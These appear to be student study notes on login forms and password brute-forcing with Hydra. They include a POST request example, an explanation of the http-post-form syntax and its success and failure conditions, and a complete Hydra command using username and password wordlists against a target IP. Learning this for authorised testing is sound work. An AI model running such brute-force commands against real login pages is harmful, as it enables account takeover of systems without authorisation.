
# 🔹 1. Login Forms (Concept)

- Login forms are **HTML forms** used for authentication.
    
- They collect:
    
    - Username
        
    - Password
        
- Data is sent to server using **HTTP request (mostly POST)**.
    

### Basic Structure:

```html
<form action="/login" method="post">
  <input type="text" name="username">
  <input type="password" name="password">
  <input type="submit">
</form>
```

---

# 🔹 2. How Login Works

1. User enters credentials
    
2. Browser:
    
    - Validates input (JavaScript)
        
    - Sends **POST request**
        
3. Server:
    
    - Checks credentials
        
    - Sends response:
        
        - Success → Dashboard / redirect
            
        - Failure → Error message
            

---

# 🔹 3. HTTP POST Request Example

```
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=john&password=1234
```

### Key Points:

- **POST** → sends data securely in body
    
- **Content-Type** → format of data
    
- **Body** → username & password
    

---

# 🔹 4. Why Login Forms are Targeted

- Common attack point in web apps
    
- Often vulnerable to:
    
    - Brute force
        
    - Weak passwords
        
    - Misconfigured validation
        

---

# 🔹 5. Hydra Tool (Important)

- Tool used for **brute-force attacks**
    
- Supports login forms using:
    
    ```
    http-post-form
    ```
    

---

# 🔹 6. Hydra Command Structure

```
hydra [options] target http-post-form "path:params:condition"
```

---

# 🔹 7. Params String (VERY IMPORTANT)

Format:

```
"path:parameters:condition"
```

### Example:

```
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

### Breakdown:

- `/` → login path
    
- `username=^USER^` → username field
    
- `password=^PASS^` → password field
    
- `F=Invalid credentials` → failure condition
    

---

# 🔹 8. Placeholders in Hydra

- `^USER^` → replaced with usernames
    
- `^PASS^` → replaced with passwords
    

---

# 🔹 9. Conditions in Hydra

## (A) Failure Condition (F=)

- Detects failed login
    
- Most commonly used
    

Example:

```
F=Invalid credentials
```

👉 If this text appears → login failed

---

## (B) Success Condition (S=)

Used when success response is clear.

Examples:

### 1. Redirect:

```
S=302
```

### 2. Keyword:

```
S=Dashboard
```

👉 If condition matches → login success

---

# 🔹 10. Steps Before Using Hydra

## 1. Inspect HTML

- Find:
    
    - form method (POST/GET)
        
    - input names (username, password)
        

## 2. Use Developer Tools (F12)

- Go to **Network tab**
    
- Submit login
    
- Observe:
    
    - Request URL
        
    - Parameters
        
    - Response
        

## 3. Use Proxy (Advanced)

- Tools:
    
    - Burp Suite
        
    - OWASP ZAP
        
- Capture full request

---

# 🔹 12. Full Hydra Command

```
hydra -L users.txt -P passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

### Options:

- `-L` → username list
    
- `-P` → password list
    
- `-f` → stop after success
    
- `-s` → port
    

---

# 🔹 13. Hydra Working

1. Takes username + password from wordlists
    
2. Sends POST request
    
3. Checks response:
    
    - If failure string found → try next
        
    - If not → **valid credentials found**
